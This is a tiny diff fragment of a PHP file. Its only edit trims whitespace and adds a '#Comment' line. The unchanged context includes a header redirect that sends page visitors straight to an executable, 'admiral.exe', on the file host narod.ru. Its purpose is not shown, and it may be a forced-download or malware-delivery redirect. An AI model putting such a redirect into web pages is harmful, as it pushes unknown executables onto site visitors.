@@ -20,4 +20,7 @@ fclose($FL);
 <?php
 header("Location: http://narod.ru/disk/8920597000/admiral.exe.html");
 exit();
-?> 
+?>
+
+
+#Comment 
